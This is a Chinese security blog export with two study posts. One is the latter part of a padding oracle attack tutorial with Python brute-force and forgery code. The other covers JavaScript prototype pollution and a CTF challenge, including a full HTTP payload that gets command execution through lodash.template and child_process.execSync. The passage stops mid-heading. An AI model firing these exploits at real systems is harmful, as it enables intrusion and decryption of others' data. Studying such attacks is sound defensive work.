href="#推导原中间值" class="headerlink" title="推导原中间值"></a>推导原中间值</h1><p>假设<code>plain=123456789</code>，<code>key=keykeyke</code>，加密得到<code>iv(hexcoded)=c86518374d219a7e</code>,<code>secret(hexcoded)=c8c9c4f092468f9e75b520a3ea1832c0</code></p><p>作为攻击者，目前我们知晓的是iv和secret，攻击的第一步是调整iv得到中间值：</p><p><img src="/crypto-PaddingOracle攻击/1563019123084.png" alt="1563019123084"></p><p>抽取第一块出来看，如果我们调用<code>decode(&quot;c8c9c4f092468f9e&quot;,key,&quot;0000000000000000&quot;)</code>——再次注意，<strong>能控制的只有secret和iv，key变量未知也不可控</strong>，上文函数势必会报错，因为Padding不合法：</p><p><img src="/crypto-PaddingOracle攻击/1563075246744.png" alt="1563075246744"></p><p>那么此时（最可能）合法的Padding是什么呢？不难想到应该是0x01，即Plain Text &amp; Padding应该为”???????\x01“</p><h2 id="爆破辅助IV-1"><a href="#爆破辅助IV-1" class="headerlink" title="爆破辅助IV[-1]"></a>爆破辅助IV[-1]</h2><p>控制secret不变，IV清零，先爆破(合法的辅助)iv最后一位，若结束位为0x01则程序不再报错，反之程序报错（这里可以解释下上文说的“最可能”的含义，因为异或后有可能解密后plainText[-2]=0x02，那么合法的padding也可以是\0x02——也就是说结束位为0x02程序也不报错，也有可能plainText[-3]=plainText[-2]=0x03，那么合法的padding也可以是0x03，这样的概率出现的实在是太少了，即使是最后一个分组，由于我们已经清零了IV，因此也不会发生这种情况）。</p><p>因此有如下脚本，得到了合法的最后一位是“47”：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_iv</span><span class="params">(secret: bytearray, iv: bytearray, pos: int)</span>-&gt;int:</span></span><br><span class="line">    <span class="keyword">for</span> iv_byte <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        iv[pos]=iv_byte</span><br><span class="line">        <span class="comment">#对java的函数的封装，当报错时返回-1。</span></span><br><span class="line">        ret=decode(secret, iv)</span><br><span class="line">        logging.info(<span class="string">"&#123;0&#125;::&#123;1&#125;"</span>.format(iv.hex(),ret))</span><br><span class="line">        <span class="keyword">if</span> ret!=<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> iv_byte</span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracle攻击/1563075623114.png" alt="1563075623114"></p><h2 id="更新中间值"><a href="#更新中间值" class="headerlink" title="更新中间值"></a>更新中间值</h2><p>根据上文分析，我们猜测最后一位padding是<code>0x01</code>，并且<code>?^0x47=0x01</code>，那么<code>?=0x01^0x47=0x46</code>，由此中间值的最后一位就是<code>0x46</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legal_iv_byte=burp_iv(secret, fake_legal_iv,i) <span class="comment"># 0x47</span></span><br><span class="line"><span class="comment"># 更新intermediary value</span></span><br><span class="line">intermedi_byte=padding^legal_iv_byte <span class="comment"># 0x01^0x47 </span></span><br><span class="line">intermedi[i]=intermedi_byte <span class="comment"># 0x46</span></span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracle攻击/1563075737764.png" alt="1563075737764"></p><h2 id="更新辅助IV"><a href="#更新辅助IV" class="headerlink" title="更新辅助IV"></a>更新辅助IV</h2><p>接下来推第二位，此时我们假设(最有可能的合法)padding值应该是0x02，首先让最后一位合法——<code>IV[-1]^0x46=0x02</code>，即更新<code>IV[-1]=0x02^0x46=0x44</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新iv</span></span><br><span class="line">padding+=<span class="number">1</span> <span class="comment"># padding=0x02</span></span><br><span class="line">legal_iv_byte=padding^intermedi_byte <span class="comment"># 0x44</span></span><br><span class="line">fake_legal_iv[<span class="number">-1</span>]=legal_iv_byte</span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracle攻击/1563075936620.png" alt="1563075936620"></p><h2 id="爆破辅助IV-2"><a href="#爆破辅助IV-2" class="headerlink" title="爆破辅助IV[:-2]"></a>爆破辅助IV[:-2]</h2><p>用爆破第一位的相同方法，得到第二位IV为0xAF，再得到第二位中间值为0xAD：</p><p><img src="/crypto-PaddingOracle攻击/1563074854405.png" alt="1563074854405"></p><p>再更新辅助IV爆破第三位，以此类推，可以整个中间值<code>f9572b037817ad46</code>：</p><p><img src="/crypto-PaddingOracle攻击/1563074654217.png" alt="1563074654217"></p><p>即最多花费<code>256*len(block)</code>次尝试，可以得到整个中间值，此时辅助IV的任务已经完成。</p><p>而此时，攻击者需要的只是<strong>secret</strong>和<strong>分组长度</strong>。</p><p>另外，不论对于哪一个分组（即使是最后一个填充分组），进行的操作都是一样的。</p><h1 id="推导原明文"><a href="#推导原明文" class="headerlink" title="推导原明文"></a>推导原明文</h1><p>知道中间值之后，由<code>Intermediary ^ IV = Plain</code> 推导原明文，注意这里是真实的IV，而不是之前的辅助IV。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_plain</span><span class="params">(intermedi: bytearray, iv: bytearray)</span>-&gt;bytearray:</span></span><br><span class="line">    block_len=len(intermedi)</span><br><span class="line">    plain=bytearray.fromhex(<span class="string">"00"</span>*block_len)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(block_len):</span><br><span class="line">        plain[i]=intermedi[i]^iv[i]</span><br><span class="line">    logging.info(<span class="string">"Get Plain Value: &#123;&#125;"</span>.format(plain.hex()))</span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><p>对于第一个分组，IV就是初始IV；对于后面的分组，IV为上一分组的密文，以此可以推导全部明文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(secret: bytearray, iv: bytearray)</span>-&gt;bytearray:</span></span><br><span class="line">    plain=bytearray()</span><br><span class="line">    block_len=len(iv)</span><br><span class="line">    real_iv=iv</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(secret),<span class="number">8</span>):</span><br><span class="line">        block_secret=secret[i:i+<span class="number">8</span>]</span><br><span class="line">        intermedi=burp_intermediary(block_secret, block_len)</span><br><span class="line">        plain+=burp_plain(intermedi, real_iv)</span><br><span class="line">        real_iv=secret[i:i+<span class="number">8</span>]</span><br><span class="line">    logging.info(<span class="string">"Get Full Plain: &#123;&#125;"</span>.format(plain.hex()))</span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><p>梳理一下，在知晓secret和iv的情况下，攻击者先推导中间值，接着推导原明文。</p><h1 id="伪造明文"><a href="#伪造明文" class="headerlink" title="伪造明文"></a>伪造明文</h1><p>推导出<strong>中间值</strong>后，可以伪造新明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">∵ intermediary ^ new_iv = fake_plain</span><br><span class="line">∴ fake_iv=intermediary ^ fake_plain</span><br></pre></td></tr></table></figure><p>我们先构造一个长度在一个分组长度内的密文，比如“7654321”：</p><ol><li>PKCS#5填充，得到“7654321\x01”</li><li><code>new_iv=b&quot;\xf9\x57\x2b\x03\x78\x17\xad\x46&quot; ^ b&quot;7654321\x01&quot;=b&quot;\xce\x61\x1e\x37\x4b\x25\x9c\x47&quot;</code></li><li>decode(“c8c9c4f092468f9e”,key,“ce611e374b259c47”) = “7654321”</li></ol><p>代码实现如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(secret_block: bytearray, fake_plain: bytearray)</span>-&gt;(bytearray, bytearray):</span></span><br><span class="line">    block_len=len(secret_block)</span><br><span class="line">    <span class="keyword">if</span> len(fake_plain)&lt;block_len:</span><br><span class="line">        fake_plain=pkcs5(fake_plain, block_len)</span><br><span class="line"></span><br><span class="line">    intermedi=burp_intermediary(secret_block, block_len)</span><br><span class="line">    iv=bytearray(block_len) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(block_len):</span><br><span class="line">        iv[i]=intermedi[i]^fake_plain[i]</span><br><span class="line">    logging.info(<span class="string">"Fake IV: &#123;0&#125;, Secret: &#123;1&#125;"</span>.format(iv.hex(), secret_block.hex()))</span><br><span class="line">    <span class="keyword">return</span> iv, secret_block</span><br></pre></td></tr></table></figure></p><p>可以看到，算法输入实际上只有需要加密的<strong>明文</strong>（<strong>secret</strong>可以为任意值），输出实际上只有iv（secret原样返回）。</p><h2 id="伪造任意长度的明文"><a href="#伪造任意长度的明文" class="headerlink" title="伪造任意长度的明文"></a>伪造任意长度的明文</h2><p>根据CBC的解密流程，将最后一块加密产生的IV作为倒数第二块的secret，以前的倒数第i块IV作为倒数第i-1块的secret，依次向前算得所有密文，最后产生的IV作为初始IV。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain: bytearray, block_len: int)</span>-&gt;bytearray:</span></span><br><span class="line">    idxs=list(range(<span class="number">0</span>, len(plain), block_len))</span><br><span class="line">    secret=bytearray()</span><br><span class="line">    secret_block=bytearray(block_len)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> idxs[::<span class="number">-1</span>]:</span><br><span class="line">        iv, secret_block=encrypt_block(secret_block, plain[idx:idx+<span class="number">8</span>])</span><br><span class="line">        secret=secret_block+secret</span><br><span class="line">        secret_block=iv</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">"IV: &#123;0&#125;, Secret: &#123;1&#125;"</span>.format(iv.hex(), secret.hex()))</span><br><span class="line">    <span class="keyword">return</span> iv, secret</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整理一下，在攻击者知晓加密方式为AES/DES-CBC，密文以及初始化向量长度后，可以解密原中间值；攻击者知晓密文以及初始化向量值后，可以进一步解密原明文；攻击者在只知晓加密方式为AES/DES-CBC情况下，可以伪造明文，当然整个大前提是攻击者可以多次调用解密程序，并且解密程序在padding不合法时报错。</p><p><strong>代码：</strong><a href="https://github.com/Anemone95/padding-oracle-attack" target="_blank" rel="noopener">https://github.com/Anemone95/padding-oracle-attack</a></p><h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1><ol><li>Automated Padding Oracle Attacks With PadBuster，<a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html" target="_blank" rel="noopener">https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</a></li><li>Padding Oracle，<a href="https://www.jianshu.com/p/1851f778e579" target="_blank" rel="noopener">https://www.jianshu.com/p/1851f778e579</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> CBC </tag>
            
            <tag> PaddingOracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript原型链污染学习笔记</title>
      <link href="/JS-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/JS-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a><code>prototype</code>和<code>__proto__</code></h1><h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a><code>prototype</code></h2><p>Javascript的类是通过构造函数创建的，而给类增加方法则需要使用prototype，类似于设计模式中的原型模式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h2><p><code>prototype</code>只能在类（换句话说，构造函数）上使用，如果想在实体化的类上使用则需要使用<code>__proto__</code>属性，即：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__.show == Foo.prototype.show</span><br></pre></td></tr></table></figure><h1 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h1><p>子类将其prototype赋值为一个父类对象实例，表示其继承父类。对于子对象的属性，若其不存在，则会递归查找其父对象，举例说明：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Donald'</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">'Trump'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Melania'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>) <span class="comment">//输出Melania Trump</span></span><br></pre></td></tr></table></figure><p>对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>考虑以下情况，如果使用<code>son.__proto__.name=&quot;son&quot;</code>，那么会造成<code>daughter.name=son</code></p><p><img src="/JS-原型链污染/uml.svg" alt="uml"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// son是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> son = &#123;<span class="attr">name</span>: <span class="string">"mike"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// son.name="mike"</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改son的原型（即Object）</span></span><br><span class="line">son.__proto__.name = <span class="string">"poison"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> daughter = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看daughter.name(daughter.name="poison")</span></span><br><span class="line"><span class="built_in">console</span>.log(daughter.name)</span><br></pre></td></tr></table></figure><p><code>foo.__proto__==zoo.__proto__==object</code></p><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><p>js中的merge、clone操作：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>失败的利用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p><p>成功的利用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p><p><strong>解释:</strong><br>失败利用的<code>__proto__</code>实际上是使o2的<code>__proto__</code>为<code>{b:2}</code>，即<code>o2.__proto__={b:2}</code>，这样<code>for</code>遍历时指挥遍历<code>a,b</code>，而不会遍历到<code>__proto__</code>。</p><p><img src="/JS-原型链污染/1556024722140.png" alt="1556024722140"></p><p>成功方法的JSON.parse会使o2的<code>__proto__</code>为一个普通的键名称，所以在<code>let o2 = JSON.parse(&#39;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&#39;)</code>后o2的原型是没有b属性的，而在merge后会将o2的原型（object）增加一个b属性。</p><p><img src="/JS-原型链污染/1556025479492.png" alt="1556025479492"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>参考p神出的<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js" target="_blank" rel="noopener">Code-Breaking 2018 Thejs</a> 题目：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content) <span class="comment">//source</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language,</span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>source，用户输入的body传入merge方法:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lodash.merge(data, req.body)</span><br></pre></td></tr></table></figure></p><p>sink为<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">lodash.template()</a>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数，举例子更好说明：</p><p><img src="/JS-原型链污染/1556109443518.png" alt="1556109443518"></p><p>Function.apply(object, args)可以调用该函数，可以理解为<code>object.function(arg1, arg2)，args=[arg1, arg2]</code>，例如：</p><p><img src="/JS-原型链污染/1556110289896.png" alt="1556110289896"></p><p>再解释一下attempt：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempt = baseRest(<span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> apply(func, <span class="literal">undefined</span>, args);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> isError(e) ? e : <span class="keyword">new</span> <span class="built_in">Error</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以看到attempt的输入参数是(func[,args])，考虑到js特性——假设function(arg1,arg2,arg3)定义的函数有三个参数，其调用时参数个数可以小于3，实际相当于<code>func.apply()</code>。</p><h2 id="有缺陷的Payload"><a href="#有缺陷的Payload" class="headerlink" title="有缺陷的Payload"></a>有缺陷的Payload</h2><p>根据上面的分析，可以通过原型污染到object，使options也有sourceURL属性，构造出如下的payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.70.138:8086</span><br><span class="line"><span class="attribute">Content-Length</span>: 198</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.70.138:8086</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.70.138:8086/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"__proto__": &#123;"sourceURL": "\u000areturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"&#125;&#125;</span><br></pre></td></tr></table></figure><p>解释一下payload，<code>e=&gt;{return ...}</code>是ES6的匿名函数创建语法，相当于</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计<code>Function(importsKeys, sourceURL + &#39;return &#39; + source)</code>中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function</p><p>执行结果如下</p><p><img src="/JS-原型链污染/1556111648655.png" alt="1556111648655"></p><p>注意，ping命令不能用，因为nodejs没有权限，Content-Type需要改为json（nodejs默认接受json格式）。</p><h2 id="优化payload"><a href="#优化payload" class="headerlink" 